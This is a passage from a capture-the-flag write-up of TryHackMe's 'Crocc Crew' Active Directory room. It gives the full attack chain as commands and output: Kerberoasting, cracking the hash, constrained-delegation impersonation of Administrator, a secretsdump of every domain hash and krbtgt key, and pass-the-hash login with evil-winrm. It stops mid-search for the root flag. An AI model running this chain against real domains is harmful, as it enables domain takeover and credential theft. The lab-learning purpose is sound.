
![[Pasted image 20250604145512.png]]

Room Link : https://tryhackme.com/room/crocccrew
Difficulty : Insane 

---
##### Initial scan

* Nmap

Command :

```
nmap -sC -sV -sS 10.10.236.0
```

Output :

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -sS 10.10.236.0            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 14:46 IST
Stats: 0:03:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 14:49 (0:00:02 remaining)
Nmap scan report for 10.10.236.0
Host is up (0.24s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 09:19:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-04T09:22:02+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Not valid before: 2025-06-03T08:40:24
|_Not valid after:  2025-12-03T08:40:24
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-04T09:19:57+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-04T09:19:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 331.93 seconds
```

We can see there is a website running in port:80

Let's Try to fuzz there,

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.96.32/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.96.32/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 5342323, Words: 0, Lines: 0, Duration: 0ms]
index.html              [Status: 200, Size: 5342323, Words: 0, Lines: 0, Duration: 0ms]
robots.txt              [Status: 200, Size: 70, Words: 2, Lines: 6, Duration: 187ms]
:: Progress: [4614/4614] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

```

Now we can look the contents in robots.txt

```
User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php
```

Hmm.. Intresting. Now that we got two other directories :

* /db-config.bak

```
$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";
```

looks like some server credentials here.

We try to log using rpcclient but go nothing interesting

command :

```
rpcclient -U% 10.10.23.38   
```
```
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdominfo
command not found: enumdominfo
rpcclient $> enumprivis
command not found: enumprivis
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
rpcclient $> bye
command not found: bye
rpcclient $> exit
```

Now we can try to login using any remotdesktop

```
┌──(kali㉿kali)-[~]
└─$ rdesktop -f -u "" 10.10.23.38
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=DC.COOCTUS.CORP


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=DC.COOCTUS.CORP
     Issuer: CN=DC.COOCTUS.CORP
 Valid From: Thu Jun  5 23:19:34 2025
         To: Fri Dec  5 23:19:34 2025

  Certificate fingerprints:

       sha1: fc18c8062752143c7dfe8c3d30d7b4d9f51edd00
     sha256: 262e1cd8ec5601c5122775947812a7e266545e188af662022305d42b0142648b

```

After connecting we got some credentials in the lockscreen wallpaper :

![[Pasted image 20250604165158.png]]

Credentials :

```
Visitor
GuestLogin!
```

Now that we got some credentials we can try credential-spray attack to the domain

we can use crackmapexec for that 
```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.23.38 -u Visitor -p GuestLogin! --users
SMB         10.10.23.38     445    DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.10.23.38     445    DC      [+] COOCTUS.CORP\Visitor:GuestLogin! 
```

We can connect to domain COOCTUS.CORP using these credentials

Now we can try to enumerate shares using the credentials 

```
smbclient -L //10.10.23.38 -U "Visitor"
```

```
Password for [WORKGROUP\Visitor]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.175.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can access to some shares
* \Home

```
┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient //10.10.175.192/Home -U "Visitor"          
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 15:42:53 2021
  ..                                  D        0  Tue Jun  8 15:42:53 2021
  user.txt                            A       17  Mon Jun  7 23:14:25 2021

		15587583 blocks of size 4096. 11430746 blocks available
smb: \> more user.txt 
getting file \user.txt of size 17 as /tmp/smbmore.zPNYd5 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

THM{Gu3st_******}
```

Using enum4linux-ng for dumping more details of the host

	enum4linux-ng is the latest version of old enum4linux

```
enum4linux-ng -U 10.10.96.32 -u 'Visitor' -p 'GuestLogin!' 
```

Now that we got domain details lets try to enumerate more using ldapdomaindump

```
ldapdomaindump 10.10.175.192 -u "COOCTUS\Visitor" -p 'GuestLogin!'
```

![[Pasted image 20250606234008.png]]

Seems that the password-reset account has the flag 'TRUSTED_TO_AUTH_FOR_DELEGATION!' set which confirms our contrained delegation theory.

```
┌──(kali㉿kali)-[~/tryhackme/crocc-crew]
└─$ impacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.10.96.32 -request -outputfile TGS.txt
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-09 03:30:39.356663  2021-06-09 03:16:23.369540  constrained 


cat TGS.txt       


$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$f6e8ac01c9789dc87ec2d90c973947e9$cd8d9385c55bebe2a8798baab9e276db1b720ded95a07446204f5729bd6f8cc8b940265c71841b9395d912fbafaa1a9262cf702f2c3d5941d064e4991d3c07fa0ebf85a84b9adb1f951b482deed984e0200c04f76253983423631488542af238f8d64537e176f6a5b12263c4fe0ffb305707fb3514ac9f77af263af8d2fdb0c626c9269daa7b49b105d5e546372aac8e20eb0e45a0bcbb3587627b4d10ca736848ab5877c60cef717b5be85f3c149753bd5980b1e44a746eb2f0a06e2cc814e5ee0041b0e9cba336b80a4338b4dce4c465bfe4427b55d8c0110a865fa6c99dcd77fb6d2ce318f8ac3f771a06cb81ffcec15e177b9219ba1f6417f9236b6cfdd906d5bdcf8dcfe20d4f3e204fe4cb8d191b2e0c5fd25fae55314340aee32839118a807d350438818810b817aa5a90127d710d2ee94e1afc92b292a7cf21f46946ac907f0258f8baa969b341f828b52aa8d6e6a508911b1dfbc3aebdda6e79ef131ed832208cd9484bfb76783091a9e4868cdae611623b00c2ce8e556f486154f29a37866d54a535546d4214f822fc10650f117eadc765cfe14dd365baee9111fea3d428182033b769a82be7a131b80344acb5d4a6ee6d4fd40f2da56fcff4b5d6f5c43af2102ca2dd2a81a304ceb03fcbe12aef5bb62623202acd7293ba8db6b2dd2d371edcc737518f1b355524a930edd0c8f9068f40c4e618b0a7dff0f81630e692d868a3e2397e22040eda59ae7891a2553d7300489ab5ac54e7545fed8efba0b3f01557b5c18ef7a618f08d2208ff8e5d2e4d0eb892a9c687471a85bc2060e986abe54789e194e583ccf00667f4068ac27ec340e3a669ff3c01d74981b143f1ea63f912269fbdda59b8b6f9a26de5c0f3293e87d0ad6af295a2d68755f7782cfd6db15a6448e7d046cce61360bd7928d494d512eec1bbc09ba5e238c460ca0b597e4dd1c1be66fc2d09467e090f7263ad4c6b87c5334ef3a10ba45c59f2419a1a539e51e469fb1ff15c745b9699f3695039c218834e35349effa10e76be655fdd0a1e2529f4282801414ff3df453dd4cd0b53deb520f38711591b9e3e8c46603f6895b8c47fe8f6c0453210305afacfa69b85a56ec4ad2a447e4a437fb04fec9f70a1aa2ccab7a802f2908905844c842ce5a6c3f14430a650ab1a9dac48d890e30a6a2eab09312de848070ef1280c9b23a98519025ff65bcf88371b44c9a3643221c2e90d86c483a1991b00276637d14d8047ddf86eefc9cb6283817f1d769d9fe09c022446c50865f2623a20ab8555f44efbe0b10774ae33057ffe0e1565050787794ceb871939e86e93139b06c96dfbb0524627759474f30614
```

Now we need to crack the TGS hash 

We can use john for this process:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_crocc 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)     
1g 0:00:00:00 DONE (2023-06-30 00:07) 3.571g/s 844800p/s 844800c/s 844800C/s rikelme..pink panther
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Using the impacket's find delegation to extract more information about the delegation.
```


Using the impacket's find delegation to extract more information about the delegation.

```
┌──(kali㉿kali)-[~/tryhackme/crocc-crew]
└─$ impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.96.32
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.13/site-packages/impacket
[+] Connecting to 10.10.96.32, port 389, SSL False, signing True
[+] Total of records returned 4
AccountName     AccountType  DelegationType                      DelegationRightsTo                   SPN Exists 
--------------  -----------  ----------------------------------  -----------------------------------  ----------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP  No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    No         

```

Delegation rights to:

```
oakley/DC.COOCTUS.CORP 
```

Using the impacket's getST script to impersonate and get the ticket of the Administrator user.  

If the account is configured with constrained delegation (with protocol transition), we can request service tickets 

```
┌──(kali㉿kali)-[~/tryhackme/crocc-crew]
└─$ impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.10.96.32
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache

```

And we got the ticket here !!
The output of this script will be a service ticket for the Administrator user.  

Once we have the ccache file, set it to the KRB5CCNAME variable so that it is loaded inside the memory and then we can use it to our advantage

```
export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache 
```

Now edit /etc/hosts to add `DC.COOCTUS.CORP` to it

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat /etc/hosts   
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.10.175.192   DC.COOCTUS.CORP
```

Now using impacket secretsdump module we can dump administrator password hash and kerberos  values

```
┌──(kali㉿kali)-[~/tryhackme/crocc-crew]
└─$ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP              
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:dbae948d823e0495e0457347191dba02d070b603573781a538570d081b115daa15d15d006b510d98866cae4803f546f07156e4c48b8c57539fc2caa3846bef50d6fde440a4b2814278ce1bc54df73c8c368450528a4371701b8da21c50631951db036a9d1857385b217b6f1f0834570a8e13f1ad8a6c1790ae955b3321f9122a1c4ed4e208b40083b067cfb4be851ee244deea187581661972e6c1977a2d3deca048cc03b0765d3b27f1756c0688ae04db6b2b569855a5a5eba62e2385f1bd8c3a3fc1737e80de889c3ad829019241327d83dcfcf3111c476229966641384abd1ee155d931837e9c4e895fda41d228ab
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:f52354f366b6f7960af46d4453d7f78c:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:f52354f366b6f7960af46d4453d7f78c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
krbtgt:des-cbc-md5:d9eff2048f2f3e46
COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
DC$:aes256-cts-hmac-sha1-96:9ee01c33b600ebbc94b03c0eb7bed164890d2af87cfcfa122a21fb75530dc5bc
DC$:aes128-cts-hmac-sha1-96:4f74741c3a92c39c5a85a447d862b88e
DC$:des-cbc-md5:808998755bdca754
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

Administrator values

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
```

We can use this hash to connect with evil-winrm

command :

```
evil-winrm -i 10.10.96.32 -u Administrator -H 'add41095f1fb0405b32f70a489de022d'
```

![[Pasted image 20250606235841.png]]

We got the access into Administrator

##### Searching for flags :

We are using `Get-childitem` for recursive searching for the flag

```
Get-Childitem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue
```

![[Pasted image 20250607000125.png]]

Here we got 3 flags in one location :

```
*Evil-WinRM* PS C:\Shares\Home> type user.txt
THM{Gu3st_******}
*Evil-WinRM* PS C:\Shares\Home> cat priv-esc.txt
THM{0n-************-DA}
*Evil-WinRM* PS C:\Shares\Home> cat priv-esc-2.txt
THM{Wh4t-t0-d0*******************}
```

Let's do the same for root flag !

```
Get-Childitem -Path C:\ -Include root.txt -File -Recurse -ErrorAction SilentlyContinue
```

```
Directory: C:\PerfLogs\Admin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/7/2021   8:07 PM             22 root.txt


*Evil-WinRM* PS C:\Shares\Home> cd \PerfLogs\Admin
*Evil-WinRM* PS C:\PerfLogs\Admin> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
